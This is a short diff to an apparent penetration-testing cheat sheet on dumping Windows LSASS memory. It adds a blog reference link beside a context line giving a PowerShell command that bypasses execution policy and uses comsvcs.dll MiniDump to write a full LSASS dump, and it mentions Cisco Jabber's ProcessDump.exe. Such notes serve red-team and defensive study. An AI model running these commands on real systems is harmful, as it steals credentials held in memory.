@@ -37,6 +37,8 @@ Can be wrapped in a powershell command too:
 Powershell.exe -ep bypass -nop -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %PID% .\Lsass.dump full
 ```
 
+[https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/](https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/)
+
 ## ProcessDump.exe from Cisco Jabber
 
 Cisco Jabber comes with a binary called ProcessDump.exe which can be used like procdump.
